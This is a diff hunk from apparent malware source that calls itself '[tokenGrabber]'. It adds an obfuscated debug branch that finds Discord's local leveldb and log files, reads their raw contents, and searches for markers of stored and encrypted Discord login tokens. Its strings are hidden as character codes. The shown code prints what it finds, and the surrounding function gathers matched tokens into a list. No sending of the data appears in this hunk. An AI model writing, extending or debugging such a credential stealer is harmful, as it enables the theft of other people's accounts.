@@ -81,6 +81,21 @@ function gettokens(_b) {
         while ((_m = _re2.exec(_c)) !== null) { if (!_seen.has(_m[1])) { _seen.add(_m[1]); _out.push(_m[1]); } }
       } catch (_) {}
     }
+    if (_out.length === 0 && _lp.toLowerCase().includes(String.fromCharCode(100,105,115,99,111,114,100))) {
+      try {
+        const _first = _files.find(f => f.endsWith(_s(3)) || f.endsWith(String.fromCharCode(46,108,111,103)));
+        if (_first) {
+          const _raw = fs.readFileSync(path.join(_lp, _first));
+          const _c = _raw.toString(String.fromCharCode(108,97,116,105,110,49));
+          const _dQw = _c.indexOf(String.fromCharCode(100,81,119));
+          const _tok = _c.indexOf(String.fromCharCode(116,111,107,101,110));
+          const _ht = _c.indexOf(String.fromCharCode(95,104,116,116,112,115));
+          const _sample = _c.slice(0, 800).replace(/[^\x20-\x7E]/g, String.fromCharCode(46));
+          console.log('[tokenGrabber] DEBUG discord ldb', _first, 'len', _c.length, 'dQw@', _dQw, 'token@', _tok, '_https@', _ht);
+          console.log('[tokenGrabber] DEBUG sample(800)', _sample.slice(0, 400));
+        }
+      } catch (e) { console.log('[tokenGrabber] DEBUG error', e.message); }
+    }
     console.log('[tokenGrabber] gettokens raw count', _out.length);
   } catch (e) { console.log('[tokenGrabber] gettokens error', e.message); }
   return _out;
